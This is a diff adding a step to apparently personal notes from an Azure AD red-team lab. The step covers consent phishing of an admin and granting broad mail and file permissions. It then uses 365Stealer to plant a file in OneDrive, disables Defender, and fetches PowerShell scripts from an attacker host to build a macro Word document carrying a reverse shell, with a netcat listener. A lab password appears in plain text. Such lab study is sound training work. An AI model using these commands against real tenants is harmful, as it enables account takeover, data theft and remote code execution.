@@ -291,3 +291,47 @@ Headers = @{
 
 (Invoke-RestMethod @RequestParams).value
 ```
+
+
+#### Step 5 - PrivEsc - now we want Admin Consent
+
+From the returned users we have identified an admin - if we can phish an admin we can get an admin consent
+
+- add more delegated permissions to the app
+  - mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send
+- email markdwalden@defcorphq.onmicrosoft.com 
+- look at token in https://jwt.io
+- using the 365Stealer webapp GUI (and the consented permissions) we can upload a file to their onedrive
+- create macro infected wordfile with a revshell back to attackers machine
+```
+$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
+$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds 
+
+Enter-PSSession -Session $officeVM 
+```
+
+- Now in the remote session:
+```Set-MpPreference -DisableRealtimeMonitoring $true```
+
+- Now, host the script Out-Word on your student VM by copying it to the C:\xampp\htdocs directory and use the below command in the PSRemoting session to load it on the office VM:
+```
+iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Out-Word.ps1")
+```
+
+- create the word doc:
+```
+Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444" -OutputFile studentx.doc
+```
+
+- copy it back to your machine:
+```
+Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
+```
+
+Now, start a listener on your student VM to catch the reverse shell: 
+
+```
+C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444 
+listening on [any] 4444 ...
+```
